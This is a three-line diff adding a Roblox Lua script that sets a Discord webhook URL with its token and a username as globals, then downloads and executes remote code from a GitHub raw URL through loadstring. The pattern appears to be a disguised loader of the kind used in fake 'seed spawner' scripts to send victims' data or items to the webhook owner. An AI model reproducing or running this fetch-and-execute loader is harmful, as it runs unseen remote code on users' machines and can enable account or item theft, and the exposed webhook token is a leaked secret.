@@ -1,0 +1,3 @@
+getfenv().Webhook = "https://discord.com/api/webhooks/1383300250311196812/hphloKStYvMiUtk5xrWhD7hSF_V00rpfRtFoBaOZ_yu5K8QTp3vkuKtOwaUEqTrFsc3g"
+getfenv().Username = "okokhellohello14"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/thinhdeptrai-netizen/Senkaispawmseed/refs/heads/main/Loader-V-1.0"))()
